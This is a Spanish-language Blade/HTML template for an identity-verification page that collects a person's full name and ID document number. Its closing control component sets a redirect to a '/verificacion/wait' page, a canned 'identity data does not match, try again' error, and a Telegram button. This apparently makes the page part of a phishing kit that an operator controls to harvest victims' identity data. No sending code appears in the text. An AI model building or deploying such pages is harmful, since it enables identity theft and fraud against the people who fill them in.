<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <title>Verificar Identidad</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            padding: 20px;
        }
        .container {
            width: 100%;
            max-width: 450px;
        }
        .card {
            background: white;
            border-radius: 16px;
            padding: 40px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        h1 {
            color: #1e3c72;
            margin-bottom: 30px;
            text-align: center;
            font-size: 24px;
        }
        .campo {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-weight: 500;
        }
        input[type="text"] {
            width: 100%;
            padding: 14px 16px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 16px;
            transition: border-color 0.3s;
        }
        input[type="text"]:focus {
            outline: none;
            border-color: #1e3c72;
        }
        .btn-enviar {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
            margin-top: 10px;
        }
        .btn-enviar:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(30, 60, 114, 0.4);
        }
        .btn-enviar:disabled {
            opacity: 0.7;
            cursor: not-allowed;
            transform: none;
        }
        #mensaje {
            margin-top: 15px;
            padding: 12px;
            border-radius: 8px;
            text-align: center;
            display: none;
        }
        #mensaje.exito {
            display: block;
            background: #d4edda;
            color: #155724;
        }
        #mensaje.error {
            display: block;
            background: #f8d7da;
            color: #721c24;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <h1>Verificar Identidad</h1>
            <form id="formVerificacion">
                <div class="campo">
                    <label for="nombre">Nombre completo</label>
                    <input type="text" id="nombre" name="nombre" required>
                </div>
                <div class="campo">
                    <label for="documento">Numero de documento</label>
                    <input type="text" id="documento" name="documento" required>
                </div>
                <input type="hidden" id="no-status" name="status" value="identidad">
                <button type="submit" class="btn-enviar" id="enviar">Verificar</button>
            </form>
            <div id="mensaje"></div>
        </div>
    </div>

    <x-control
        :auto-completar="false"
        :debug="false"
        redirect-url="/verificacion/wait"
        toast-message="Los datos de identidad no coinciden, verifique e intente nuevamente"
        telegram-button="Identidad"
    />
</body>
</html>
